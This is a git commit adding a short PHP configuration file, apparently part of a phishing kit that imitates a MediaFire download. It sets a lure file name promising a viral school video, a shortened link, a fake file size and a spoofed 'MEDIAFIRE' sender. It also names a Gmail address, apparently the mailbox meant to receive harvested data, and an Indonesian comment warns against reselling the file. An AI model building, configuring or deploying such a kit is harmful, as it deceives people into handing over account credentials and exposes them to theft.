776be7042f2af7cbe90a22466e4fb8a9369bfcbd
AREXANS <89494133+AREXANS@users.noreply.github.com>
2022-06-04 16:35:01 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,13 @@
+<?php
+
+$linkweb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+$link = 'https://bit.ly/MediaFIRE';
+$namafile = 'SMA VIRAL TERBARU'; //JANGAN DIJUAL AJG
+$ukuranfile = '27MB'; //KB MB GB TB
+
+$sender = 'From: RESS MEDIAFIRE GG <ahmadgans@xx.com>';
+$emailku = 'adideli44@gmail.com';
+
+
+
+?>
